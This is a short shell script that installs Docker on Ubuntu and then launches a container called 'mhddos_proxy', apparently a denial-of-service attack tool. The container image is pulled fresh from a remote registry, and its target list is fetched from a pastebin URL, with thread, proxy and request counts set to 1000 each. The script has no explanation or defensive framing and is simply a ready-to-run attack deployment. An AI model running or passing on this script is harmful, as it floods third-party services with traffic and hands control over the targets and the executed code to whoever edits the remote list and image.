sudo apt-get update
sudo apt -y install apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository -y "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
sudo apt-get -y install docker-ce docker-ce-cli containerd.io

sudo docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://pastebin.com/raw/KahaAEgH -t 1000 -p 1000 --rpc 1000